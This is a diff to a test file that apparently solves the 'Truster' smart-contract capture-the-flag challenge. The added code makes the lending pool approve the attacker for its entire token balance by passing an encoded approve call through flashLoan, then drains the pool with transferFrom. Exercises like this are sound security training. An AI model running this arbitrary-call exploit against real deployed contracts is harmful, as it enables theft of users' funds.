@@ -22,7 +22,28 @@ describe('[Challenge] Truster', function () {
     });
 
     it('Execution', async function () {
-        /** CODE YOUR SOLUTION HERE */
+        const abi = ["function approve(address spender, uint256 amount)"];
+        const iface = new ethers.utils.Interface(abi);
+        const data = iface.encodeFunctionData("approve", [player.address, TOKENS_IN_POOL]);
+    
+        console.log(`Calling flashLoan...`);
+        const tx = await pool.flashLoan(0, player.address, token.address, data);
+        await tx.wait(); // Wait for the transaction to be mined
+
+        const allowance = await token.allowance(pool.address, player.address);
+        console.log(`Allowance after flashLoan: ${allowance.toString()}`);
+        expect(allowance).to.equal(TOKENS_IN_POOL);
+
+        if (allowance.toString() === TOKENS_IN_POOL.toString()) {
+        console.log(`Transferring tokens...`);
+        await token.connect(player).transferFrom(pool.address, player.address, TOKENS_IN_POOL);
+        } else {
+        console.log(`Allowance not set. Something went wrong.`);
+    }
+
+
+
+
     });
 
     after(async function () {
